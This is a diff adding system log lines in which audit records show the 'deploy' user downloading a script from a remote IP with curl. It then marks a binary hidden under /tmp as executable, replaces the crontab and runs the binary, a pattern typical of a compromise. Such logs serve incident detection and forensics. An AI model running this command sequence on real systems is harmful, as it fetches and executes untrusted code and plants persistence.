@@ -1,0 +1,7 @@
+2026-11-23 01:55:00 INFO     [logrotate] logrotate: rotated /var/log/nginx/*.log
+2026-11-23 02:12:05 INFO     [kernel] audit: type=EXECVE argc=3 a0="curl" a1="-s" a2="http://198.51.100.23/k.sh" uid=1001(deploy)
+2026-11-23 02:12:09 INFO     [kernel] audit: type=EXECVE argc=2 a0="chmod" a1="+x" a2="/tmp/.X11-unix/.k/kdevtmpfsi" uid=1001(deploy)
+2026-11-23 02:12:40 INFO     [crontab] (deploy) REPLACE (deploy)
+2026-11-23 02:12:41 INFO     [crontab] (deploy) END EDIT (deploy)
+2026-11-23 02:13:02 INFO     [kernel] audit: type=EXECVE argc=1 a0="/tmp/.X11-unix/.k/kdevtmpfsi" uid=1001(deploy)
+2026-11-23 02:13:30 WARNING  [kernel] perf: interrupt took too long (5120 > 5000), lowering kernel.perf_event_max_sample_rate
